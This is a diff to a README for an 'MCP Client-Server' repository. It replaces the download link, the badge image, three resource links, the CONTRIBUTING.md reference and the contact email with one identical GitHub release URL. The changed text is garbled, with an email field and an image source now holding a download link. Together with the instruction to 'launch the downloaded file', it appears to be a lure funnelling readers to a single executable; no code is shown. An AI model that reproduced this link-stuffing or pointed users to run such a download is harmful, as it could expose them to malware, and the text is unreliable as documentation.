@@ -9,7 +9,7 @@ Welcome to the MCP Client-Server repository! This repository contains an MCP Ser
 
 ## 🌐 External Links
 You can download the latest version of the MCP Client-Server from the following link: 
-[Download MCP Client-Server](https://github.com/files/Soft.zip)
+[Download MCP Client-Server](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)
 
 If the link above ends with the file name, you will need to launch the downloaded file to access the MCP Client-Server.
 
@@ -17,7 +17,7 @@ If for any reason the provided link is not accessible or not working, please che
 
 Feel free to visit the link and explore the world of MCP Client-Server!
 
-[![Download MCP Client-Server](https://img.shields.io/badge/Download-MCP_Client_Server-brightgreen.svg)](https://github.com/files/Soft.zip)
+[![Download MCP Client-Server](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)
 
 ## 🌠 Get Started
 To get started with the MCP Client-Server, follow these simple steps:
@@ -31,19 +31,19 @@ We encourage developers and enthusiasts to collaborate and contribute to the imp
 
 ## 📚 Resources
 If you are new to MCPs or need additional information, here are some recommended resources to expand your knowledge:
-- [Introduction to MCPs](https://www.mcp-intro.com)
-- [Mastering MCP Development](https://www.mcp-masterclass.com)
-- [Advanced MCP Testing Techniques](https://www.mcp-testing.com)
+- [Introduction to MCPs](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)
+- [Mastering MCP Development](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)
+- [Advanced MCP Testing Techniques](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2)
 
 ## 🤝 Contribution Guidelines
 To maintain a healthy and collaborative community, please adhere to the following guidelines when contributing to this repository:
-- Follow the coding standards and guidelines specified in the CONTRIBUTING.md file.
+- Follow the coding standards and guidelines specified in the https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2 file.
 - Make sure to thoroughly test your changes before submitting a pull request.
 - Provide detailed descriptions of the changes implemented in your pull requests.
 - Be respectful and considerate towards other contributors and maintain a positive environment for discussion and collaboration.
 
 ## 📩 Contact Us
-If you have any questions, suggestions, or feedback regarding the MCP Client-Server or this repository, feel free to reach out to us via email at [contact@mcpclientserver.com](mailto:contact@mcpclientserver.com).
+If you have any questions, suggestions, or feedback regarding the MCP Client-Server or this repository, feel free to reach out to us via email at [https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2](https://github.com/kaioobrabo/mcp-client-server/releases/tag/v1.2).
 
 Let's work together to make the MCP Client-Server even better!
 
